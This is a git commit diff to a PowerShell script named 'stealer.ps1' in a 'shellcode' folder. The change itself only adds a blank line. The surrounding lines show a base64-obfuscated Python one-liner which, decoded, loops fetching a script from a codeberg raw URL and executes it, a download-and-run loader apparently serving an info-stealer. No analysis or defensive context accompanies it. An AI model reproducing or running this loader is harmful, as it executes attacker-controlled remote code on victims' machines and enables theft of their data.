4bd5d096f4bd914cc876b1d166db846c9481e910
43a1723 <hai1723notgay@gmail.com>
2024-12-03 16:12:03 +0700

    Update stealer.ps1

--- shellcode/stealer.ps1
+++ shellcode/stealer.ps1
@@ -4,3 +4,4 @@ if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
 } else {
     Start-Process python -ArgumentList '-c', 'exec(__import__("base64").b64decode(b"aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCB0aW1lCgp1cmwgPSAiaHR0cHM6Ly9jb2RlYmVyZy5vcmcvNDNhMTcyMy9oYWkxNzIzL3Jhdy9icmFuY2gvbWFpbi9hL21haW4ucHkiCgp3aGlsZSBUcnVlOgogICAgdHJ5OgogICAgICAgIGNvbnRlbnQgPSB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHVybCkucmVhZCgpCiAgICAgICAgZXhlYyhjb250ZW50KQogICAgICAgIGJyZWFrCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgdGltZS5zbGVlcCgzKQ=="))'
 }
+
